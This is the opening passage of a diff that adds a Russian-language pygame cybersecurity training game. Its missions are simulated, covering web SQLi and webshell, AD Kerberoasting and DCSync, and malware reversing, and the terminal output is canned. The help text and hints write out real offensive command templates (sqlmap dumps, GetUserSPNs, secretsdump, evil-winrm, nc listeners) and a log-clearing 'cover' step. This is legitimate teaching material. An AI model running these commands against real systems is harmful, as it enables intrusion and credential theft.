@@ -1,0 +1,3158 @@
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  GHOST PROTOCOL: CYBER OPS  v5.0                            ║
+║  Educational HackTheBox-style Cybersecurity Trainer         ║
+║  Гелич К.А. | КЕМ-25-01 | РГУ нефти и газа (НИУ)           ║
+╠══════════════════════════════════════════════════════════════╣
+║  Установка:  pip install pygame requests python-dotenv      ║
+║  API-ключ:   создай .env → OPENROUTER_API_KEY=sk-or-...     ║
+║  Запуск:     python ghost_protocol_v5.py                    ║
+╚══════════════════════════════════════════════════════════════╝
+
+Версия 5.0 — улучшения:
+  • Строгая валидация КАЖДОЙ команды с примерами правильного ввода
+  • Более реалистичный вывод всех инструментов
+  • Полностью завершены все три миссии
+  • Улидения UI: анимированная карта сети, hex-дисплей, граф AD
+  • Исправлены баги tab-completion и скроллинга
+  • Улучшена система навыков и дебрифинга
+"""
+
+# ─── Стандартная библиотека ─────────────────────────────────
+import os, sys, math, time, random, json, textwrap, threading
+from dataclasses import dataclass, field
+from typing import Optional, List, Dict, Tuple, Callable, Any
+from enum import Enum, auto
+from pathlib import Path
+
+# ─── Опциональные зависимости ──────────────────────────────
+try:
+    import pygame
+except ImportError:
+    print("ОШИБКА: установите pygame:  pip install pygame")
+    sys.exit(1)
+
+try:
+    import requests as _req
+    HAS_NET = True
+except ImportError:
+    HAS_NET = False
+
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass
+
+# ═══════════════════════════════════════════════════════════════
+#  КОНСТАНТЫ LAYOUT
+# ═══════════════════════════════════════════════════════════════
+SW, SH   = 1440, 860
+FPS      = 60
+VIS_W    = 340
+TERM_W   = 760
+HUD_W    = SW - VIS_W - TERM_W   # 340
+SAVE_FILE = Path("gp_save.json")
+
+# ═══════════════════════════════════════════════════════════════
+#  ЦВЕТОВАЯ ПАЛИТРА
+# ═══════════════════════════════════════════════════════════════
+P = {
+    "bg"    : (4,    7,  16),
+    "panel" : (8,   14,  30),
+    "panel2": (12,  20,  44),
+    "border": (0,   55, 125),
+    "bordhi": (0,  138, 255),
+    "green" : (0,  230, 110),
+    "dkgrn" : (0,   42,  20),
+    "cyan"  : (0,  205, 250),
+    "blue"  : (45, 115, 245),
+    "red"   : (235,  40,  55),
+    "dkred" : (80,   10,  16),
+    "yellow": (255, 198,   0),
+    "orange": (255, 118,   0),
+    "purple": (155,  32, 245),
+    "pink"  : (255,  42, 190),
+    "white" : (212, 228, 252),
+    "gray"  : (78,  98, 130),
+    "dim"   : (36,  46,  70),
+    "dkgray": (18,  26,  46),
+    # Цвета строк терминала
+    "tc"  : (0,   230, 110),   # команда
+    "to"  : (0,   200, 100),   # ok / успех
+    "ti"  : (0,   205, 250),   # info
+    "tw"  : (255, 198,   0),   # предупреждение
+    "te"  : (235,  40,  55),   # ошибка
+    "td"  : (170, 202, 252),   # данные
+    "ts"  : (65,   85, 118),   # системный / dim
+    "th"  : (255,  42, 190),   # заголовок
+    "tai" : (132, 248, 168),   # oracle AI
+    "tadv": (255,  92, 112),   # adversary
+}
+THR      = [(0,200,80),(180,180,0),(220,120,0),(220,40,40),(255,0,40)]
+THR_NAME = ["НОЛЬ","НИЗКИЙ","СРЕДНИЙ","ВЫСОКИЙ","КРИТ"]
+
+# ═══════════════════════════════════════════════════════════════
+#  СОХРАНЕНИЕ / ЗАГРУЗКА
+# ═══════════════════════════════════════════════════════════════
+def save_progress(gd: dict):
+    try:
+        SAVE_FILE.write_text(json.dumps(gd, ensure_ascii=False, indent=2))
+    except Exception:
+        pass
+
+def load_progress() -> dict:
+    try:
+        if SAVE_FILE.exists():
+            return json.loads(SAVE_FILE.read_text())
+    except Exception:
+        pass
+    return {}
+
+# ═══════════════════════════════════════════════════════════════
+#  ДАННЫЕ МИССИЙ
+# ═══════════════════════════════════════════════════════════════
+MISSIONS = {
+    "m1": {
+        "name"   : "ЦИФРОВОЙ СЛЕД",
+        "code"   : "ОПЕРАЦИЯ «ЦИФРОВОЙ СЛЕД»",
+        "target" : "ShopFast e-commerce  —  10.10.14.22",
+        "ip"     : "10.10.14.22",
+        "diff"   : "★☆☆",
+        "type"   : "web",
+        "tags"   : ["SQLi", "File Upload", "PHP RCE", "Privesc"],
+        "desc"   : ("Интернет-магазин на PHP 7.4 / Apache 2.4. "
+                    "Подозрение: SQL-инъекция в API и небезопасная загрузка файлов."),
+        "bullets": [
+            "Разведка: gobuster + nikto",
+            "Эксплойт: SQLi → webshell",
+            "Постэксплойт: sudo privesc → корневой доступ"
+        ],
+        "reward" : {"cr": 15000, "xp": 1200, "sp": 2},
+        "objectives": [
+            {"key": "recon",   "text": "Найти скрытые директории (gobuster/nikto)"},
+            {"key": "sqli",    "text": "Подтвердить SQL-инъекцию (sqlmap)"},
+            {"key": "shell",   "text": "Загрузить PHP-webshell и получить RCE"},
+            {"key": "privesc", "text": "Повысить привилегии до root (sudo)"},
+            {"key": "dump",    "text": "Экфильтровать таблицу credit_cards"},
+        ],
+    },
+    "m2": {
+        "name"   : "СТАЛЬНАЯ КОРПОРАЦИЯ",
+        "code"   : "ОПЕРАЦИЯ «СТАЛЬНАЯ КОРПОРАЦИЯ»",
+        "target" : "MegaSteel Ltd. AD  —  10.10.10.0/24",
+        "ip"     : "10.10.10.0/24",
+        "diff"   : "★★☆",
+        "type"   : "network",
+        "tags"   : ["AD", "Kerberoast", "Pass-Hash", "DCSync"],
+        "desc"   : ("Корпоративная сеть Windows / Active Directory. "
+                    "Слабые политики Kerberos → полный захват домена."),
+        "bullets": [
+            "Kerberoasting → взлом хэша сервисного аккаунта",
+            "Lateral movement (evil-winrm)",
+            "DCSync → хэш Administrator"
+        ],
+        "reward" : {"cr": 35000, "xp": 2800, "sp": 3},
+        "objectives": [
+            {"key": "scan",       "text": "Просканировать сеть (nmap)"},
+            {"key": "enum",       "text": "Перечислить SMB и пользователей домена"},
+            {"key": "kerberoast", "text": "Провести Kerberoasting и получить TGS-хэш"},
+            {"key": "crack",      "text": "Взломать хэш (hashcat/john)"},
+            {"key": "lateral",    "text": "Войти на DC через evil-winrm"},
+            {"key": "dcsync",     "text": "Дамп хэшей через secretsdump (DCSync)"},
+        ],
+    },
+    "m3": {
+        "name"   : "БИНАРНЫЙ ЛАБИРИНТ",
+        "code"   : "ОПЕРАЦИЯ «БИНАРНЫЙ ЛАБИРИНТ»",
+        "target" : "DarkLoader malware sample  —  localhost",
+        "ip"     : "localhost",
+        "diff"   : "★★★",
+        "type"   : "reversing",
+        "tags"   : ["Rev Eng", "Binary", "Patch", "Crypto"],
+        "desc"   : ("Перехвачен образец малвари ELF64. "
+                    "Задача: реверс, патч проверки пароля, извлечь ключ AES."),
+        "bullets": [
+            "Статический анализ: file/strings/objdump/nm",
+            "Патч бинаря: gdb/patchelf",
+            "Извлечение ключа → расшифровка C2-трафика"
+        ],
+        "reward" : {"cr": 80000, "xp": 5000, "sp": 5},
+        "objectives": [
+            {"key": "identify", "text": "Идентифицировать тип файла (file)"},
+            {"key": "strings",  "text": "Найти подозрительные строки (strings)"},
+            {"key": "disasm",   "text": "Дизассемблировать check_password (objdump/nm)"},
+            {"key": "bypass",   "text": "Обойти проверку пароля (gdb patch)"},
+            {"key": "keydump",  "text": "Извлечь ключ AES из памяти (gdb/python3)"},
+            {"key": "decrypt",  "text": "Расшифровать C2-трафик (openssl)"},
+        ],
+    },
+}
+
+# ═══════════════════════════════════════════════════════════════
+#  НАВЫКИ (sid, name, branch, desc, cost, pos_rel, requires)
+# ═══════════════════════════════════════════════════════════════
+SKILLS = [
+    # Разведка
+    ("r1","Продвинутый OSINT",   "Разведка",
+     "Дополнительные техники разведки.\nShodan, WhatsMyName, theHarvester.",
+     1,(0.50,0.18),[]),
+    ("r2","Пассивная разведка",  "Разведка",
+     "Сбор данных без активного сканирования.\n−15% обнаружения на recon.",
+     2,(0.28,0.46),["r1"]),
+    ("r3","Соц. инженерия",      "Разведка",
+     "Фишинг и претекстинг.\n+25% успех social-атак.",
+     2,(0.72,0.46),["r1"]),
+    ("r4","Охотник угроз",       "Разведка",
+     "Видишь ловушки до атаки.\nHoneypot-риск снижен на 70%.",
+     3,(0.50,0.74),["r2","r3"]),
+    # Атака
+    ("a1","Надёжный эксплойт",   "Атака",
+     "+20% шанс успеха exploit.\nМеньше шума в сети.",
+     1,(0.50,0.18),[]),
+    ("a2","Zero-Day арсенал",    "Атака",
+     "Расширенный набор эксплойтов.\nДоступ к продвинутым векторам.",
+     2,(0.28,0.46),["a1"]),
+    ("a3","Living off the Land", "Атака",
+     "Используешь легитимные инструменты.\n−30% обнаружения при атаках.",
+     2,(0.72,0.46),["a1"]),
+    ("a4","Полный захват",       "Атака",
+     "Авто-эскалация привилегий.\nПосле initial access — сразу root.",
+     3,(0.50,0.74),["a2","a3"]),
+    # Постэксплойт
+    ("p1","Сокрытие следов",     "Постэксплойт",
+     "cover снижает −30% угрозы (вместо −20%).",
+     1,(0.50,0.18),[]),
+    ("p2","Постоянный доступ",   "Постэксплойт",
+     "Backdoor стойче к детектированию.\n−50% вероятность обнаружения.",
+     2,(0.28,0.46),["p1"]),
+    ("p3","Криптоанализ",        "Постэксплойт",
+     "Ускоренный взлом хэшей.\nАвто-режим для NTLM/bcrypt.",
+     2,(0.72,0.46),["p1"]),
+    ("p4","ПРИЗРАК",             "Постэксплойт",
+     "Легендарный навык.\nУровень угрозы не превышает 50%.",
+     4,(0.50,0.74),["p2","p3"]),
+]
+
+SKILL_BRANCH_X = {
+    "Разведка"    : int(SW * 0.22),
+    "Атака"       : SW // 2,
+    "Постэксплойт": int(SW * 0.78),
+}
+
+def skill_pos(sid: str) -> Tuple[int, int]:
+    for s in SKILLS:
+        if s[0] == sid:
+            bx = SKILL_BRANCH_X.get(s[2], SW // 2)
+            return (bx + int((s[5][0] - 0.5) * 200),
+                    150 + int(s[5][1] * (SH - 320)))
+    return SW // 2, SH // 2
+
+# ═══════════════════════════════════════════════════════════════
+#  СОСТОЯНИЕ ИГРЫ
+# ═══════════════════════════════════════════════════════════════
+class GameState:
+    def __init__(self):
+        self.credits       : int        = 0
+        self.xp            : int        = 0
+        self.sp            : int        = 2
+        self.skills        : set        = set()
+        self.done_missions : List[str]  = []
+        self.active_mid    : str        = ""
+        self.objectives    : Dict[str, bool] = {}
+        self.flags         : Dict[str, Any]  = {}
+        self.threat        : float      = 0.0
+        self.hints_used    : int        = 0
+        self.start_time    : float      = time.time()
+        self.actions       : List[str]  = []
+
+    def to_dict(self) -> dict:
+        return {
+            "credits"      : self.credits,
+            "xp"           : self.xp,
+            "sp"           : self.sp,
+            "skills"       : list(self.skills),
+            "done_missions": self.done_missions,
+        }
+
+    def from_dict(self, d: dict):
+        self.credits       = d.get("credits", 0)
+        self.xp            = d.get("xp", 0)
+        self.sp            = d.get("sp", 2)
+        self.skills        = set(d.get("skills", []))
+        self.done_missions = d.get("done_missions", [])
+
+    def start_mission(self, mid: str):
+        self.active_mid = mid
+        self.threat     = 0.0
+        self.hints_used = 0
+        self.start_time = time.time()
+        self.actions    = []
+        self.objectives = {o["key"]: False for o in MISSIONS[mid]["objectives"]}
+        self.flags      = _init_flags(mid)
+
+    def complete_obj(self, key: str) -> bool:
+        if key in self.objectives and not self.objectives[key]:
+            self.objectives[key] = True
+            return True
+        return False
+
+    def all_done(self) -> bool:
+        return bool(self.objectives) and all(self.objectives.values())
+
+    def add_threat(self, delta: float):
+        ghost = "p4" in self.skills
+        cap   = 0.50 if ghost else 1.0
+        lotl  = 0.30 if "a3" in self.skills else 0.0
+        self.threat = min(cap, self.threat + delta * (1.0 - lotl))
+
+    def cover(self):
+        bonus = 0.10 if "p1" in self.skills else 0.0
+        self.threat = max(0.0, self.threat - 0.20 - bonus)
+
+
+def _init_flags(mid: str) -> dict:
+    if mid == "m1":
+        return {
+            "nmap_done"     : False,
+            "gobuster_done" : False,
+            "nikto_done"    : False,
+            "sqli_found"    : False,
+            "sqli_confirmed": False,
+            "shell_uploaded": False,
+            "shell_path"    : "",
+            "shell_active"  : False,
+            "privesc_done"  : False,
+            "db_dumped"     : False,
+            "known_paths"   : {"/": {}, "/index.php": {}, "/login.php": {}},
+        }
+    if mid == "m2":
+        return {
+            "nmap_done"       : False,
+            "enum_done"       : False,
+            "kerberoast_done" : False,
+            "hash_file"       : "",
+            "cracked"         : False,
+            "creds"           : "",
+            "lateral_done"    : False,
+            "dcsync_done"     : False,
+            "known_hosts"     : {
+                "10.10.10.1": {"name": "gateway", "state": "unknown"},
+            },
+        }
+    # m3
+    return {
+        "file_done"    : False,
+        "strings_done" : False,
+        "disasm_done"  : False,
+        "bypass_done"  : False,
+        "key_extracted": False,
+        "decrypted"    : False,
+        "found_key"    : "",
+    }
+
+# ═══════════════════════════════════════════════════════════════
+#  ИИ-МОДУЛЬ  (OpenRouter)
+# ═══════════════════════════════════════════════════════════════
+class AI:
+    URL = "https://openrouter.ai/api/v1/chat/completions"
+
+    def __init__(self):
+        self.key   = os.getenv("OPENROUTER_API_KEY", "")
+        self.model = os.getenv("AI_MODEL", "meta-llama/llama-3.1-8b-instruct:free")
+        self._ohist: List[dict] = []
+        self._ahist: List[dict] = []
+        self._osys  = ""
+        self._asys  = ""
+
+    @property
+    def ok(self): return bool(self.key) and HAS_NET
+
+    def reset(self, gs: "GameState"):
+        mid  = gs.active_mid
+        m    = MISSIONS[mid]
+        done = [k for k, v in gs.objectives.items() if v]
+        pend = [k for k, v in gs.objectives.items() if not v]
+        self._osys = (
+            "Ты — ORACLE, ИИ-наставник в обучающем тренажёре кибербезопасности. "
+            f"Текущая миссия: {m['code']}. Тип: {m['type']}. "
+            f"Выполнено: {done}. Осталось: {pend}. "
+            "Правило: давай ПОДСКАЗКИ (не пиши готовые команды целиком). "
+            "Используй реальную ИБ-терминологию. По-русски, 2-3 предложения."
+        )
+        self._asys = (
+            f"Ты — автоматизированная система защиты '{m['target']}'. "
+            "Реагируй коротко и угрожающе на обнаруженные атаки (1-2 предложения)."
+        )
+        self._ohist = []
+        self._ahist = []
+
+    def _call(self, sys_p, hist, msg, cb, mtok=200):
+        if not self.ok:
+            cb(None)
+            return
+        try:
+            r = _req.post(
+                self.URL,
+                headers={
+                    "Authorization": f"Bearer {self.key}",
+                    "Content-Type" : "application/json",
+                    "HTTP-Referer" : "https://ghost-protocol.edu",
+                    "X-Title"      : "Ghost Protocol",
+                },
+                json={
+                    "model"      : self.model,
+                    "max_tokens" : mtok,
+                    "messages"   : [{"role": "system", "content": sys_p}]
+                                   + hist + [{"role": "user", "content": msg}],
+                },
+                timeout=20,
+            )
+            text = r.json()["choices"][0]["message"]["content"]
+            hist.append({"role": "user",      "content": msg})
+            hist.append({"role": "assistant", "content": text})
+            if len(hist) > 20:
+                hist[:] = hist[-20:]
+            cb(text)
+        except Exception as e:
+            cb(f"[AI Error: {e}]")
+
+    def oracle(self, prompt: str, cb: Callable, gs: "GameState" = None):
+        p = prompt
+        if gs:
+            recent = "; ".join(gs.actions[-4:])
+            p += f"  [последние действия: {recent}]"
+        threading.Thread(
+            target=self._call,
+            args=(self._osys, self._ohist, p, cb),
+            daemon=True,
+        ).start()
+
+    def adversary(self, prompt: str, cb: Callable):
+        threading.Thread(
+            target=self._call,
+            args=(self._asys, self._ahist, prompt, cb, 80),
+            daemon=True,
+        ).start()
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ДВИЖОК КОМАНД  — класс результата
+# ═══════════════════════════════════════════════════════════════
+@dataclass
+class R:
+    """Контейнер вывода команды: список (text, color_key)."""
+    lines: List[Tuple[str, str]] = field(default_factory=list)
+
+    def _a(self, t: str, c: str) -> "R":
+        self.lines.append((str(t), c))
+        return self
+
+    def ok   (self, t): return self._a(t, "to")
+    def info (self, t): return self._a(t, "ti")
+    def warn (self, t): return self._a(t, "tw")
+    def err  (self, t): return self._a(t, "te")
+    def data (self, t): return self._a(t, "td")
+    def head (self, t): return self._a(t, "th")
+    def sys  (self, t): return self._a(t, "ts")
+    def ai   (self, t): return self._a(t, "tai")
+    def add  (self, t, c="td"): return self._a(t, c)
+    def blank(self): return self._a("", "ts")
+
+
+# ═══════════════════════════════════════════════════════════════
+#  ДИСПЕТЧЕР КОМАНД
+# ═══════════════════════════════════════════════════════════════
+def run_cmd(raw: str, gs: GameState) -> R:
+    raw   = raw.strip()
+    if not raw:
+        return R()
+    parts = raw.split()
+    verb  = parts[0].lower()
+    args  = parts[1:]
+    rest  = " ".join(args)
+    r     = R()
+
+    # Журнал действий
+    gs.actions.append(raw)
+    if len(gs.actions) > 100:
+        gs.actions = gs.actions[-80:]
+
+    # ── Универсальные команды ────────────────────────────────
+    if verb in ("help", "помощь"):
+        return _help(gs)
+
+    if verb in ("clear", "cls", "очист"):
+        return R()  # терминал сам очистит
+
+    if verb == "history":
+        return _history(gs)
+
+    if verb == "whoami":
+        r.ok("ghost"); return r
+
+    if verb == "id":
+        r.ok("uid=1000(ghost) gid=1000(ghost) groups=1000(ghost)"); return r
+
+    if verb == "hostname":
+        r.ok("kali-ghost"); return r
+
+    if verb == "uname":
+        if "-a" in rest:
+            r.ok("Linux kali-ghost 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux")
+        else:
+            r.ok("Linux")
+        return r
+
+    if verb == "date":
+        r.ok(time.strftime("  %a %d %b %Y %H:%M:%S UTC")); return r
+
+    if verb == "pwd":
+        r.ok("/home/ghost"); return r
+
+    if verb == "echo":
+        r.ok("  " + rest); return r
+
+    if verb in ("cover", "covers", "clean"):
+        bonus = "(+10% бонус навык)" if "p1" in gs.skills else ""
+        gs.cover()
+        r.ok(f"  [+] Следы заметены. Уровень угрозы снижен {bonus}")
+        r.sys("  [*] Временные файлы удалены, логи очищены")
+        return r
+
+    # ── Роутинг по активной миссии ───────────────────────────
+    mid = gs.active_mid
+    if mid == "m1": return _m1(verb, args, rest, gs, r)
+    if mid == "m2": return _m2(verb, args, rest, gs, r)
+    if mid == "m3": return _m3(verb, args, rest, gs, r)
+
+    r.err(f"  bash: {verb}: command not found")
+    r.sys("  Введи 'help' для справки")
+    return r
+
+
+# ═══════════════════════════════════════════════════════════════
+#  УНИВЕРСАЛЬНЫЕ УТИЛИТЫ КОМАНД
+# ═══════════════════════════════════════════════════════════════
+def _help(gs: GameState) -> R:
+    r   = R()
+    mid = gs.active_mid
+    r.head("╔══════════════════════════════════════════════════════╗")
+    r.head("║          GHOST PROTOCOL — СПРАВКА                   ║")
+    r.head("╚══════════════════════════════════════════════════════╝")
+
+    m1_help = [
+        ("РАЗВЕДКА", [
+            "nmap -sV -p 80,443,22 <host>          — сканирование портов",
+            "gobuster dir -u <url> -w <wordlist>   — перебор директорий",
+            "nikto -h <url>                        — сканер уязвимостей",
+            "curl [опции] <url>                    — HTTP запрос",
+            "wfuzz -c -z file,<list> -u <url>/FUZZ — фаззинг параметров",
+        ]),
+        ("АТАКА", [
+            "sqlmap -u <url> [--dbs|--tables|--dump]   — SQL-инъекция",
+            "upload <файл>         — загрузить через /upload.php",
+            "burp                  — запустить Burp Suite proxy",
+        ]),
+        ("ПОСТЭКСПЛОЙТ", [
+            "webshell <команда>    — RCE через загруженный shell",
+            "nc -lvnp <порт>       — слушатель обратного соединения",
+            "sudo -l               — проверить sudo-привилегии",
+            "sudo <команда>        — выполнить как root",
+            "mysql [-u root]       — подключиться к MySQL",
+            "ls [путь]             — список файлов (в shell)",
+            "cat <файл>            — прочитать файл (в shell)",
+            "find <путь> [опции]   — поиск файлов",
+        ]),
+    ]
+    m2_help = [
+        ("РАЗВЕДКА", [
+            "nmap -sV -p- <host|CIDR>  — сканирование сети",
+            "ping <host>               — проверка доступности",
+        ]),
+        ("ПЕРЕЧИСЛЕНИЕ", [
+            "enum4linux-ng -A <IP>                  — SMB/LDAP перечисление",
+            "smbclient //<IP>/<share> -N             — SMB шара",
+            "crackmapexec smb <CIDR> [-u user -p pw]",
+            "bloodhound-python -c All -u u -p p -d domain -ns <IP>",
+            "kerbrute userenum --dc <IP> -d <dom> <file>",
+        ]),
+        ("KERBEROS / LATERAL", [
+            "GetUserSPNs.py <dom>/<u>:<pw> -dc-ip <IP> -request",
+            "hashcat -m 13100 <hash_file> <wordlist>",
+            "john <hash_file> --wordlist=<wordlist>",
+            "evil-winrm -i <IP> -u <user> -p <pass>",
+            "secretsdump.py <dom>/<u>:<pw>@<IP>",
+            "psexec.py <dom>/<u>:<pw>@<IP>",
+        ]),
+    ]
+    m3_help = [
+        ("АНАЛИЗ ФАЙЛА", [
+            "file <бинарь>             — определить тип",
+            "checksec --file=<бинарь>  — защиты бинаря",
+            "readelf -a <бинарь>       — заголовки ELF",
+            "nm -n <бинарь>            — таблица символов",
+        ]),
+        ("СТАТИЧЕСКИЙ АНАЛИЗ", [
+            "strings [-a] <бинарь> [| grep <pattern>]  — извлечь строки",
+            "xxd <файл> | head -N                       — hex-дамп",
+            "objdump -d -M intel <бинарь>               — дизассемблирование",
+            "strace ./<бинарь>                          — системные вызовы",
+            "ltrace ./<бинарь>                          — библиотечные вызовы",
+        ]),
+        ("ЭКСПЛУАТАЦИЯ / ДЕШИФРОВАНИЕ", [
+            "gdb -q ./<бинарь>                          — отладка / патч в памяти",
+            "r2 <бинарь>                                — radare2 анализ",
+            "python3 -c 'import struct; ...'            — скрипт анализа",
+            "openssl enc -d -aes-256-cbc -k <key> -in <file> -out <out>",
+        ]),
+    ]
+
+    secs = {
+        "m1": m1_help, "m2": m2_help, "m3": m3_help,
+    }.get(mid, m1_help)
+
+    for sec_name, cmds in secs:
+        r.blank()
+        r.info(f"  ┌─ {sec_name} " + "─" * max(0, 42 - len(sec_name)))
+        for c in cmds:
+            r.data(f"  │  {c}")
+    r.blank()
+    r.sys("  Универсальные: whoami  id  hostname  uname -a  pwd  date  history  clear")
+    r.sys("  Снизить угрозу: cover   |   ИИ-подсказка: oracle [вопрос]")
+    r.blank()
+    return r
+
+
+def _history(gs: GameState) -> R:
+    r = R()
+    r.head("  ── История команд ──")
+    for i, c in enumerate(gs.actions[-25:], 1):
+        r.sys(f"  {i:3d}  {c}")
+    return r
+
+
+def _not_found(verb: str) -> R:
+    r = R()
+    r.err(f"  bash: {verb}: command not found")
+    r.sys("  Введи 'help' для справки по командам миссии")
+    return r
+
+
+# ═══════════════════════════════════════════════════════════════
+#  МИССИЯ 1 — WEB HACKING
+# ═══════════════════════════════════════════════════════════════
+TIP  = "10.10.14.22"
+TURL = f"http://{TIP}"
+
+def _m1(verb, args, rest, gs: GameState, r: R) -> R:
+    f = gs.flags
+
+    # ── nmap ─────────────────────────────────────────────────
+    if verb == "nmap":
+        if not args:
+            r.err("  Ошибка: не указан хост")
+            r.sys("  Использование: nmap [опции] <host>")
+            r.sys("  Пример:  nmap -sV -p 80,443,22 10.10.14.22")
+            return r
+        host = next((a for a in args if not a.startswith("-")), None)
+        if not host:
+            r.err("  Ошибка: аргументы без хоста")
+            r.sys("  Пример:  nmap -sV 10.10.14.22")
+            return r
+
+        r.info(f"  Starting Nmap 7.94 — scan report for {host}")
+        r.sys( f"  Host is up (0.022s latency).")
+        r.blank()
+        r.data( "  PORT      STATE   SERVICE     VERSION")
+        r.data( "  ────────────────────────────────────────────────────────")
+        r.ok(   "  22/tcp    open    ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11")
+        r.ok(   "  80/tcp    open    http        Apache httpd 2.4.52 (Ubuntu)")
+        r.ok(   "  443/tcp   open    ssl/http    Apache httpd 2.4.52")
+        r.sys(  "  3306/tcp  closed  mysql")
+        r.sys(  "  8080/tcp  closed  http-proxy")
+        if "-sV" in rest or "-A" in rest:
+            r.blank()
+            r.warn("  |_http-title:    ShopFast — Онлайн магазин v4.2")
+            r.warn("  |_http-generator: PHP/7.4.33")
+            r.warn("  |_ssl-cert:       shopfast.local")
+        r.blank()
+        r.sys( "  Nmap done: 1 IP scanned in 12.46 seconds")
+        r.warn("  [→] Порт 80 открыт — изучи сайт:")
+        r.warn(f'       gobuster dir -u {TURL} -w /usr/share/wordlists/common.txt')
+        gs.add_threat(0.03)
+        f["nmap_done"] = True
+        return r
+
+    # ── gobuster / dirb / ffuf / feroxbuster ─────────────────
+    if verb in ("gobuster", "dirb", "ffuf", "feroxbuster"):
+        if verb == "gobuster":
+            if "dir" not in rest:
+                r.err("  Ошибка: для gobuster обязателен режим 'dir'")
+                r.sys("  Использование: gobuster dir -u <url> -w <wordlist>")
+                r.sys(f"  Пример:  gobuster dir -u {TURL} -w /usr/share/wordlists/common.txt")
+                return r
+            if "-u" not in rest:
+                r.err("  Ошибка: не указан URL (-u)")
+                r.sys(f"  Пример:  gobuster dir -u {TURL} -w wordlist.txt")
+                return r
+            if "-w" not in rest:
+                r.err("  Ошибка: не указан wordlist (-w)")
+                r.sys("  Пример:  gobuster dir -u <url> -w /usr/share/wordlists/common.txt")
+                return r
+
+        url = next((a for a in args if "http" in a), TURL)
+        r.info(f"  {verb} dir -u {url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
+        r.sys( "  ──────────────────────────────────────────────────────")
+        pages = [
+            ("/index.php",        "200", "4.8 KB",  ""),
+            ("/login.php",        "200", "2.3 KB",  ""),
+            ("/about.php",        "200", "1.1 KB",  ""),
+            ("/admin",            "301", "0 B",     " → /admin/"),
+            ("/admin/",           "200", "8.9 KB",  "  ← Административная панель!"),
+            ("/upload.php",       "200", "1.2 KB",  "  ← Форма загрузки файлов"),
+            ("/api/",             "403", "0 B",     ""),
+            ("/api/users.php",    "200", "23 KB",   "  ← /api/users.php?id=1  (SQLi?)"),
+            ("/api/products.php", "200", "51 KB",   ""),
+            ("/config.php",       "403", "0 B",     ""),
+            ("/config.php.bak",   "200", "0.4 KB",  "  ← backup файл конфига!"),
+            ("/backup/",          "403", "0 B",     ""),
+            ("/uploads/",         "403", "0 B",     "  ← директория загрузок"),
+        ]
+        for path, code, size, note in pages:
+            col = "to" if code == "200" else "tw" if code in ("301", "403") else "te"
+            r.add(f"  /{path.lstrip('/'):<32} [{code}]  [{size:>7}]{note}", col)
+
+        r.blank()
+        r.sys( "  Время: 00:01:14  |  Найдено: 9 (200)  |  Пропущено: 4")
+        f["gobuster_done"] = True
+        f["known_paths"].update({
+            "/admin/"         : {"status": 200, "vuln": ""},
+            "/upload.php"     : {"status": 200, "vuln": "file_upload"},
+            "/api/users.php"  : {"status": 200, "vuln": "sqli"},
+            "/config.php.bak" : {"status": 200, "vuln": "info_disclosure"},
+            "/uploads/"       : {"status": 403, "vuln": ""},
+        })
+        gs.complete_obj("recon")
+        gs.add_threat(0.05)
+        r.blank()
+        r.warn("  [!] Интересные находки:")
+        r.warn("       /admin/          — открытая админка")
+        r.warn("       /upload.php      — форма загрузки (нет MIME-проверки?)")
+        r.warn("       /api/users.php?id=1  — GET-параметр без валидации")
+        r.warn("       /config.php.bak  — backup конфига, доступен напрямую!")
+        r.warn(f'  [→] Следующий шаг:  sqlmap -u "{TURL}/api/users.php?id=1" --dbs --batch')
+        return r
+
+    # ── nikto ────────────────────────────────────────────────
+    if verb == "nikto":
+        if not args:
+            r.err("  Ошибка: не указан хост")
+            r.sys("  Использование: nikto -h <url|IP>")
+            r.sys(f"  Пример:  nikto -h {TURL}")
+            return r
+        url = next((a for a in args if a not in ("-h", "-p", "-ssl", "-o")), TIP)
+        r.info(f"  - Nikto v2.1.6  /  Target: {url}")
+        r.sys( "  ──────────────────────────────────────────────────────")
+        findings = [
+            ("+ Server: Apache/2.4.52 (Ubuntu)",                              "td"),
+            ("+ X-Frame-Options header not present — Clickjacking возможен",  "tw"),
+            ("+ X-Content-Type-Options не установлен",                        "tw"),
+            ("+ /upload.php: PHP file upload — MIME проверяется только по расширению!", "te"),
+            ("+ /admin/: Basic Auth без rate-limit — брутфорс возможен",      "te"),
+            ("+ /api/users.php: GET param 'id' — SQL Injection (error-based)", "te"),
+            ("+ /config.php.bak: backup конфига доступен!",                   "te"),
+            ("+ PHP/7.4.33: устарела — CVE-2022-31625, CVE-2022-31628",       "tw"),
+            ("+ 8783 запросов за 00:01:42  |  0 ошибок  |  8 находок",       "to"),
+        ]
+        for txt, col in findings:
+            r.add(f"  {txt}", col)
+        r.blank()
+        r.warn(f'  [→] Подтверди SQLi:  sqlmap -u "{TURL}/api/users.php?id=1" --batch')
+        gs.add_threat(0.06)
+        return r
+
+    # ── curl / wget ───────────────────────────────────────────
+    if verb in ("curl", "wget"):
+        if not args:
+            r.err(f"  Ошибка: не указан URL")
+            r.sys(f"  Использование: {verb} [опции] <url>")
+            r.sys(f"  Пример:  {verb} {TURL}/api/users.php?id=1")
+            return r
+        url = next((a for a in args if a.startswith("http") or "/" in a), TURL)
+        if "users.php" in url:
+            if "'" in url or "'" in rest or "OR" in rest.upper() or "--" in rest:
+                r.err("  HTTP/1.1 500 Internal Server Error")
+                r.err("  Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given")
+                r.err("  SQL error: syntax error near ''' at line 1")
+                r.blank()
+                r.ok("  [+] SQL-ошибка подтверждена! Параметр 'id' уязвим.")
+                r.warn(f'  [→] sqlmap -u "{TURL}/api/users.php?id=1" --dbs --batch')
+                f["sqli_found"] = True
+            else:
+                r.sys("  HTTP/1.1 200 OK")
+                r.ok('  {"id":1,"username":"admin","email":"admin@shopfast.ru","role":"admin"}')
+                r.warn("  [!] Попробуй: id=1' — проверить на SQLi")
+        elif "upload" in url:
+            r.sys("  HTTP/1.1 200 OK")
+            r.data("  <form action='upload.php' method='POST' enctype='multipart/form-data'>")
+            r.warn("  <input type='file' name='userfile'>  <!-- accept не ограничен! -->")
+            r.warn("  [!] Нет валидации MIME. Попробуй: upload shell.php.jpg")
+        elif "admin" in url and ("-u" in rest or "--user" in rest):
